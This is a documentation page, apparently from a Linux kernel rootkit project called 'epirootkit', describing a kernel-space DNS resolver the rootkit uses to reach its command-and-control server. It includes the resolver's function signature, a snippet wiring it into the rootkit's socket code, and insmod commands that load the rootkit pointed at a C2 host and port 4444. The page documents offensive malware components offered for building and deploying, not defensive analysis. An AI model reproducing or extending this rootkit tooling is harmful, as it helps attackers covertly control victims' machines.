---
title: "DNS Resolution"
description: "Kernel-space domain name resolution for flexible C2 connectivity"
icon: "globe"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 514
---

# DNS Resolution

The rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.

## Overview

The DNS resolver:
- Resolves domain names to IP addresses in kernel space
- Uses UDP DNS queries to 8.8.8.8
- Automatically falls back to direct IP if address is already an IP
- Supports A record queries for IPv4 addresses

## Implementation

### Files
- `rootkit/network/dns_resolver.c` - DNS client implementation
- `rootkit/network/dns_resolver.h` - API header

### Key Function

```c
int kernel_dns_resolve(const char *hostname, u32 *ip_addr);
```

**Parameters:**
- `hostname`: Domain name to resolve
- `ip_addr`: Pointer to store resolved IP (network byte order)

**Returns:** 0 on success, negative error code on failure

### Process

1. Create UDP socket in kernel space
2. Build DNS query packet (A record lookup)
3. Send query to 8.8.8.8:53
4. Parse response and extract IPv4 address

### Integration

The socket connection code automatically detects IP vs domain:

```c
if (!in4_pton(config.address, -1, (u8*)&server_addr.sin_addr.s_addr, -1, NULL)) {
    /* Not an IP - resolve domain */
    ret = kernel_dns_resolve(config.address, &target_ip);
    if (ret < 0) return ret;
    server_addr.sin_addr.s_addr = target_ip;
}
```

## Usage

### Domain name:
```bash
sudo insmod epirootkit.ko address=c2.example.com port=4444
```

### IP address (bypasses DNS):
```bash
sudo insmod epirootkit.ko address=192.168.1.100 port=4444
```

## Technical Details

### DNS Protocol
- Protocol: UDP
- Server: 8.8.8.8:53
- Query type: A records only
- Query ID: 0x1234 (static)
- Buffer size: 256 bytes

